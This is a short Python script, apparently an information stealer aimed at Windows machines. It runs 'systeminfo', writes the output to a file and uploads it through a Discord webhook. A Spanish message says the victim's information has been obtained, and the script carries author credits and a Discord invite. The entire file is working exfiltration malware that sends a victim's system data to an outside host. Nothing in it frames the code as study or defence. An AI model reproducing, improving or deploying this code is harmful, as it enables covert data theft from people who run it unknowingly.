#!/usr/bin/env python
#_*_ coding: utf8 _*_

from discord_webhook import DiscordWebhook, DiscordEmbed
from subprocess import check_output
import subprocess
import os
import time

a = check_output('systeminfo',stderr=subprocess.STDOUT)

f = open('xd.txt','wb')
f.write(a)
f.close()

webhook = DiscordWebhook(url='DISCORD WEBHOOK URL')

def credits():
    embed = DiscordEmbed(title='Creditos:', description='CUCHILLO', color='03b2f8')
    embed.add_embed_field(name="Discord", value="cuchillo#7116")
    embed.add_embed_field(name='‎      ‏‏‎', value="https://discord.gg/sfFyhPSY7s")

    webhook.add_embed(embed)

    response = webhook.execute(credits)

def embedt():

    embed = DiscordEmbed(title='INFO', description='Se ha obtenido la info de la víctima 🡻', color='03b2f8')

    webhook.add_embed(embed)

    response = webhook.execute(embedt)

def txt():
    path = os.getcwd()
    paths = path + r"\xd.txt"
    with open(paths, "rb") as f:
        webhook.add_file(file=f.read(), filename='info.txt')

    response = webhook.execute(txt)

credits()
embedt()
txt()
